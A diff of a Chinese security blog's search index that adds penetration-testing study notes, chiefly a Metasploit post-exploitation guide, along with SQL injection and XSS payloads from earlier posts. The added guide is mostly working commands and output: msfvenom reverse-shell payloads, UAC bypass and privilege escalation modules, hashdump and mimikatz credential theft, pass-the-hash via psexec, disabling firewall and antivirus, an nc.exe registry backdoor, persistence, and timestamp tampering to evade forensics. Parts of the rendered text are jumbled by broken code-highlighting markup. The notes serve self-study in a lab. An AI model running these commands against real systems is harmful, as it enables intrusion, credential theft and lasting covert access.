@@ -1395,6 +1395,9 @@
 <p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x5c),1))#submit=submit</code></p>
 <p><strong>爆字段名</strong></p>
 <p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=&#39;admin&#39;)aa),0x5c),1))#submit=submit</code></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://blog.csdn.net/SKI_12/article/details/56279676" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/56279676</a></p>
+<p><a href="https://www.cnblogs.com/ssooking/p/8137597.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssooking/p/8137597.html</a></p>
+<p><a href="https://blog.csdn.net/qq_41420747/article/details/81836327" target="_blank" rel="noopener">https://blog.csdn.net/qq_41420747/article/details/81836327</a></p>
 ]]></content>
       <categories>
         <category>web漏洞学习</category>
@@ -1653,8 +1656,7 @@
   <entry>
     <title>XSS漏洞学习</title>
     <url>/2020/04/03/xss-lou-dong-xue-xi/</url>
-    <content><![CDATA[<h2 id="XSS漏洞学习笔记-靶场实战"><a href="#XSS漏洞学习笔记-靶场实战" class="headerlink" title="XSS漏洞学习笔记+靶场实战"></a>XSS漏洞学习笔记+靶场实战</h2><p>[TOC]</p>
-<h3 id="XSS漏洞相关知识点"><a href="#XSS漏洞相关知识点" class="headerlink" title="XSS漏洞相关知识点"></a>XSS漏洞相关知识点</h3><h5 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h5><p>​         XSS是跨站脚本攻击，属于被动式的攻击。XSS指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。</p>
+    <content><![CDATA[<h2 id="XSS漏洞学习笔记-靶场实战"><a href="#XSS漏洞学习笔记-靶场实战" class="headerlink" title="XSS漏洞学习笔记+靶场实战"></a>XSS漏洞学习笔记+靶场实战</h2><h3 id="XSS漏洞相关知识点"><a href="#XSS漏洞相关知识点" class="headerlink" title="XSS漏洞相关知识点"></a>XSS漏洞相关知识点</h3><h5 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h5><p>​         XSS是跨站脚本攻击，属于被动式的攻击。XSS指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。</p>
 <h5 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h5><ul>
 <li>非持久性XSS攻击，当用户访问已被插入攻击代码的链接时，攻击代码执行，完成该次攻击。</li>
 <li>持久型XSS攻击，攻击者把攻击代码永久存储在目标服务器上中，例如数据库，消息论坛，留言板，访问者日志等。当用户进入页面，代码就会被执行。</li>
@@ -1741,7 +1743,6 @@
 <li><script>alert(document.cookie)</script>
 </li>
 <li><script>window.location="(黑页地址)";</script> 
-
 <p>document.body.innerHTML=”<div style=visblity:visble;><h1></p>
 </li>
 </ul>
@@ -1976,6 +1977,11 @@
 <h5 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h5><p>代码要求我们以<a href="https://www.segmentfault.com开头，输入点是在" target="_blank" rel="noopener">https://www.segmentfault.com开头，输入点是在</a><>标签中，我们可以用</script>闭合前面 在后面加注释绕过</p>
 <p><code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code></p>
 <p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200120205401.png)</p>
+<h4 id="xss常见绕过waf方法"><a href="#xss常见绕过waf方法" class="headerlink" title="xss常见绕过waf方法"></a>xss常见绕过waf方法</h4><p>可以参考这篇文章：<a href="https://blog.csdn.net/God_XiangYu/article/details/99592359，写的很全面，" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99592359，写的很全面，</a></p>
+<h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><p><a href="https://blog.csdn.net/SKI_12/article/details/60468362" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/60468362</a></p>
+<p><a href="https://www.cnblogs.com/leestar54/p/5798937.html" target="_blank" rel="noopener">https://www.cnblogs.com/leestar54/p/5798937.html</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1517634" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1517634</a></p>
+<p><a href="https://wetest.qq.com/lab/view/422.html?from=content_gad" target="_blank" rel="noopener">https://wetest.qq.com/lab/view/422.html?from=content_gad</a></p>
 ]]></content>
       <categories>
         <category>web漏洞学习</category>
@@ -2277,12 +2283,114 @@
   <entry>
     <title>msf后渗透部分学习</title>
     <url>/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h2 id="msf后渗透常见操作总结"><a href="#msf后渗透常见操作总结" class="headerlink" title="msf后渗透常见操作总结"></a>msf后渗透常见操作总结</h2><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><ul>
+<li><p>已经获得目标系统控制权后扩大战果</p>
+<ul>
+<li>提权</li>
+<li>信息收集</li>
+<li>渗透内网</li>
+<li>永久后门</li>
+</ul>
+</li>
+<li><p>基于已有 session 扩大战果</p>
+<ul>
+<li><pre><code>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -f exe -o payload.exe
+<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> kali 监听</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>
+msf &gt; use exploit/multi/handler
+msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set LHOST 10.0.0.128
+msf exploit(multi/handler) &gt; exploit -j
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>windows 系统执行 payload.exe</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>kali 进入 metepreter</span><br></pre></td></tr></table></figure>
+msf exploit(multi/handler) &gt; sessions 
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<h1 id="Active-sessions"><a href="#Active-sessions" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p>
+<hr>
+<p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p>
+<p>msf exploit(multi/handler) &gt; sessions </p>
+<h1 id="Active-sessions-1"><a href="#Active-sessions-1" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p>
+<hr>
+<p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p>
+<p>msf exploit(multi/handler) &gt; sessions -i 1<br>[*] Starting interaction with 1…</p>
+<p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John</p>
+<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">2.</span>获取<span class="keyword">system</span>账号权限</span><br><span class="line"></span><br><span class="line">- 提权失败，一般是由于 UAC 限制</span><br></pre></td></tr></table></figure>
+<p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John<br>meterpreter &gt; load priv<br>[-] The ‘priv’ extension has already been loaded.<br>meterpreter &gt; getsystem<br>[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:<br>[-] Named Pipe Impersonation (In Memory/Admin)<br>[-] Named Pipe Impersonation (Dropper/Admin)<br>[-] Token Duplication (In Memory/Admin)</p>
+<p>meterpreter &gt; background</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>绕过 UAC 限制</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ask</span><br></pre></td></tr></table></figure>
+<p>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  set FILENAME win_update.exe<br>  set SESSION 1<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">ai4HMWI.png</span>)</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\MXYqrBh.png</span>)</span><br></pre></td></tr></table></figure><br>meterpreter &gt; getsystem<br>meterpreter &gt; getuid</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\uHed9pJ.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure>
+<p>use exploit/windows/local/bypassuac<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>show targets<br>exploit</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\eO3yUbv.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac_injection</span><br></pre></td></tr></table></figure>
+<p>use exploit/windows/local/bypassuac_injection<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VwGyhJD.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞直接提权为 system</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ms13<span class="emphasis">_053_</span>schlamperei</span><br></pre></td></tr></table></figure>
+<p>  use exploit/windows/local/ms13_053_schlamperei<br>  set SESSION 1<br>  <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ![<span class="string">img</span>](<span class="link">https://i.imgur.com/VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_081_</span>track<span class="emphasis">_popup_</span>menu</span><br></pre></td></tr></table></figure><br>use exploit/windows/local/ms13_081_track_popup_menu<br>set SESSION 1<br>exploit</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_097_</span>ie<span class="emphasis">_registry_</span>symlink</span><br></pre></td></tr></table></figure>
+<p>use exploit/windows/local/ms13_097_ie_registry_symlink<br>set SESSION 1<br>set URIPATH /<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>set SRVHOST 10.0.0.128<br>exploit</p>
+<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ppr_flatten_rec</span><br></pre></td></tr></table></figure>
+<p>use exploit/windows/local/ppr_flatten_rec<br>set SESSION 1<br>exploit</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Jhqu2n4.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>图形化 payload</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set payload windows/vncinject/reverse_tcp</span><br></pre></td></tr></table></figure>
+<pre><code>use exploit/windows/local/ppr_flatten_rec
+set payload windows/vncinject/reverse_tcp
+set SESSION 1
+set LHOST 10.0.0.128
+set ViewOnly false
+exploit
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/wOXJo7u.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭 UAC 功能</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>获取 hashdump</span><br></pre></td></tr></table></figure></code></pre><p>  meterpreter &gt; hashdump<br>      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      John:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>  <figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>尝试利用</span><br></pre></td></tr></table></figure><br>  use exploit/windows/smb/psexec<br>  set RHOST 10.0.0.132<br>  set SMBUser John<br>  set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/vXDrNNx.png</span>)</span><br><span class="line"></span><br><span class="line">报错：Exploit failed [no-access]</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>需要提前关闭 UAC</span><br></pre></td></tr></table></figure><br>sessions -i 2<br>shell<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br>shutdown -r -t 0</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/WJBykgA.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>再次利用</span><br></pre></td></tr></table></figure>
+<p>use exploit/windows/smb/psexec<br>set RHOST 10.0.0.132<br>set SMBUser John<br>set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p>
+<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">4.</span>基础操作 </span><br><span class="line"></span><br><span class="line">##### 关闭 防火墙</span><br><span class="line"></span><br><span class="line">- 需要管理员或<span class="keyword">system</span>权限</span><br></pre></td></tr></table></figure>
+<p>netsh advfirewall set allprofiles state on<br>netsh advfirewall set allprofiles state off</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/VsB8p0A.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">##### 关闭windefend</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>查看服务名称</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/SITzUbY.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭防火墙</span><br></pre></td></tr></table></figure>
+<p>  net stop windefend<br>  <figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### bitlocker 加密</span><br><span class="line"></span><br><span class="line">- manage-bde -off C:</span><br><span class="line">- manage-bde -status C:</span><br><span class="line"></span><br><span class="line">##### 关闭DEP</span><br><span class="line"></span><br><span class="line">- bcdedit.exe /set &#123;current&#125; nx AlwaysOff</span><br><span class="line"></span><br><span class="line">##### 杀死防病毒软件</span><br><span class="line"></span><br><span class="line">- run killav</span><br><span class="line">- run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line">##### 开启远程桌面服务</span><br></pre></td></tr></table></figure></p>
+<h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><p>run post/windows/manage/enable_rdp</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Dl02OVL.png</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="关闭服务"><a href="#关闭服务" class="headerlink" title="关闭服务"></a>关闭服务</h1><p>run multi_console_command -rc root/.msf4/loot/20180418001805_default_10.0.0.132_host.windows.cle_842354.txt</p>
+<h1 id="开启服务-1"><a href="#开启服务-1" class="headerlink" title="开启服务"></a>开启服务</h1><p>run getgui –e<br>run getgui -u yuanfh -p pass<br>run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 查看远程桌面</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>screenshot</span><br><span class="line"><span class="bullet">- </span>use espia</span><br><span class="line"><span class="bullet">  - </span>screengrab</span><br><span class="line"></span><br><span class="line"><span class="section">##### 使用tokens攻击域控制器</span></span><br><span class="line"></span><br><span class="line">tokens, 用户每次登录，账号绑定临时的tokens,访问资源时提交 tokens 进行身份验证，类似于 web cookies。</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>Incognito</span><br><span class="line"><span class="bullet">  - </span>独立功能的软件，被 msf 集成在 metepreter 中</span><br><span class="line"><span class="bullet">  - </span>无需密码或破解或获取密码 hash，窃取 tokens 将自己伪装成其他用户</span><br><span class="line"><span class="bullet">  - </span>尤其适用于域环境下提权渗透多操作系统</span><br><span class="line"><span class="bullet">- </span>搭建域环境</span><br><span class="line"><span class="bullet">  - </span>DC + XP</span><br><span class="line"><span class="bullet">- </span>load incognito</span><br><span class="line"><span class="bullet">  - </span><span class="code">`list_tokens -u`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`impersonate_token lab\administrator`</span></span><br><span class="line"><span class="bullet">- </span>运行以上命令需要 getsystem</span><br><span class="line"><span class="bullet">  - </span>本地普通权限用户需要先本地权限</span><br><span class="line"><span class="bullet">  - </span><span class="code">`use exploit/windows/local/ms10_015_kitrap0d`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`execute -f cmd.exe -i -t # -t：`</span>使用当前假冒tokens执行程序</span><br><span class="line"><span class="bullet">  - </span>shell</span><br><span class="line"></span><br><span class="line"><span class="section">##### 注册表</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>注册表保存着 windows 几乎全部配置参数</span><br><span class="line"><span class="bullet">  - </span>如果修改不当，可直接造成系统崩溃</span><br><span class="line"><span class="bullet">  - </span>修改前完整备份注册表</span><br><span class="line"><span class="bullet">  - </span>某些注册表的修改是不可逆的</span><br><span class="line"><span class="bullet">- </span>常见用途</span><br><span class="line"><span class="bullet">  - </span>修改、增加启动项</span><br><span class="line"><span class="bullet">  - </span>窃取存储于注册表中的机密信息</span><br><span class="line"><span class="bullet">  - </span>绕过文件型病毒查杀</span><br><span class="line"><span class="bullet">- </span>用注册表添加 nc 后门服务（metepreter）</span><br></pre></td></tr></table></figure>
+<p>meterpreter &gt;</p>
+<p>upload /usr/share/windows-binaries/nc.exe C:\windows\system32</p>
+<p>reg enumkey -k HKLM\software\microsoft\windows\currentversion\run</p>
+<p>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d </p>
+<p>‘C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe’</p>
+<p>reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -v nc</p>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>打开防火墙端口（metepreter）</span><br></pre></td></tr></table></figure>
+<p>meterpreter &gt;<br>execute -f cmd -i -H<br>netsh firewall show opmode<br>netsh firewall add portopening TCP 4444 “test” ENABLE ALL<br>shutdown -r -f -t 0<br>nc 10.0.0.132 444</p>
+<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 其他注册表项</span><br><span class="line">  - https:<span class="comment">//support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</span></span><br><span class="line"></span><br><span class="line">##### 抓包</span><br><span class="line"></span><br><span class="line">- 抓包（metepreter）</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>
+<pre><code>load sniffer
+sniffer_interfaces
+sniffer_start 2
+sniffer_dump 2 1.cap / sniffer_dump 2 1.cap
+在内存中缓冲区块循环存储抓包（50000包），不写硬盘
+智能过滤 metepreter 流量，传输全称使用 SSL/TLS 加密
+<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 解码</span><br><span class="line"></span><br><span class="line">  - use auxiliary/sniffer/psnuffle</span><br><span class="line">  - set PCAPFILE /root/<span class="number">1.</span>cap</span><br><span class="line"></span><br><span class="line">##### 搜索文件</span><br><span class="line"></span><br><span class="line">- search -f *.ini</span><br><span class="line">- search -d c:\documents\ and\ settings\administrator\desktop\ -f *.docx</span><br><span class="line"></span><br><span class="line">##### 破解弱口令</span><br><span class="line"></span><br><span class="line">- John the Ripper 破解弱口令</span><br></pre></td></tr></table></figure></code></pre><ul>
+<li>use post/windows/gather/hashdump # system 权限的 metepreter</li>
+<li>run # 结果保存在 /tmp 目录下</li>
+<li>use auxiliary/analyze/jtr_crack_fast</li>
+<li>run<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 擦除痕迹</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>文件系统访问会留下痕迹。电子取证重点关注</span><br><span class="line"><span class="bullet">- </span>渗透测试和攻击者往往希望销毁文件系统访问痕迹</span><br><span class="line"><span class="bullet">- </span>最好的避免被电子取证发现的方法：不要碰文件系统</span><br><span class="line"><span class="bullet">  - </span>metepreter 的先天优势所在（完全基于内存）</span><br><span class="line"><span class="bullet">- </span>MAC 时间 （Modified / Accessed / Changed）</span><br><span class="line"><span class="bullet">  - </span>ls -l –time=atime/mtime/ctime 1.txt</span><br><span class="line"><span class="bullet">  - </span>stat 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -d “2 days ago” 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -t 1501010101 1.txt</span><br><span class="line"><span class="bullet">- </span>MACE：MFT entry</span><br><span class="line"><span class="bullet">  - </span>MFT：NTFS 文件系统的主文件分配表 Master File Table</span><br><span class="line"><span class="bullet">  - </span>通常 1024 字节或2个硬盘扇区，其中存放多项 entry 信息</span><br><span class="line"><span class="bullet">  - </span>包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期）</span><br><span class="line"><span class="bullet">  - </span>更多信息可研究文件系统取证分析技术</span><br><span class="line"></span><br><span class="line"><span class="section">##### pivoting 跳板 /枢纽/支点</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>msfvenom 制作 payload</span><br></pre></td></tr></table></figure>
+msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=kali_firewall LPORT=4444 -b “\x00\xff” -e x86/shikata_ga_nai -f exe -o payload.exe<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>获取 system 权限</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/PXgwA0S.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用已经控制的一台计算机作为入侵内网的跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>在其他内网计算机看来访问全部来自于跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>run autoroute -s 1.1.1.0/24 # 不能访问外网的被攻击目标内网网段</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>自动路由现实场景</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>
+  利用 win7 攻击内网 XP（对比 xp 有无外网访问权的情况）<br>  – 扫描内网：use auxiliary/scanner/portscan/tcp  <figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> Pivoting 之端口转发 portfwd</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>
+  利用已经被控计算机，在kali 与攻击目标之间实现端口转发<br>  portfwd add -L LIP -l LPORT -r RIP -p RPORT<br>  portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389<br>  portfwd list / delete / flush  <figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure>
+set RHOST 127.0.0.1<br>set LHOST 2.1.1.10<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set exitonsession false</span><br><span class="line"></span><br><span class="line"><span class="section">#### 持久后门</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞取得的 metepreter 运行内存中，重启失效</span><br><span class="line"><span class="bullet">- </span>重复 exploit 漏洞可能造成服务崩溃</span><br><span class="line"><span class="bullet">- </span>持久后门保证漏洞修复后仍可远程控制</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>metepreter 后门</span><br></pre></td></tr></table></figure>
+run metsvc -A # 删除 -r<br>use exploit/multi/handler<br>set PAYLOAD windows/metsvc_bind_tcp<br>set LPORT 31337<br>set RHOST 1.1.1.1<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>持久后门</span><br></pre></td></tr></table></figure>
+run persistence -h<br>run persistence -X -i 10 -p 4444 -r 10.0.0.128<br>run persistence -U -i 20 -p 4444 -r 10.0.0.128<br>run persistence -S -i 20 -p 4444 -r 10.0.0.128<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### mimikatz</span><br><span class="line"></span><br><span class="line">- hashdump 使用的就是 mimikatz 的部分功能</span><br></pre></td></tr></table></figure>
+getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��tspkg ��livessp<br>mimikatz_command -h<br>mimikatz_command -f a::<br>mimikatz_command -f samdump::hashes<br>mimikatz_command -f handle::list<br>mimikatz_command -f service::list<br>mimikatz_command -f crypto::listProviders<br>mimikatz_command -f winmine::infos # 扫雷游戏<pre><code>
+
+</code></pre></li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透测试学习</category>
+      </categories>
+      <tags>
+        <tag>msf后渗透</tag>
+      </tags>
   </entry>
   <entry>
     <title>linux提权综述</title>
     <url>/2020/04/29/linux-ti-quan-zong-shu/</url>
-    <content><![CDATA[<h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p>
+    <content><![CDATA[<h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>​        当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p>
 <p>，要判断我们应该先对系统相关的信息进行收集。</p>
 <h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul>
 <li>已经拿到低权限shell</li>
@@ -2292,10 +2400,10 @@
 <p><strong>使用命令</strong>：</p>
 <figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">uname -<span class="keyword">a</span>  或  uname -r</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p>
 <p>这样，我们就得到了系统的内核版，cpu架构，和发行版等信息</p>
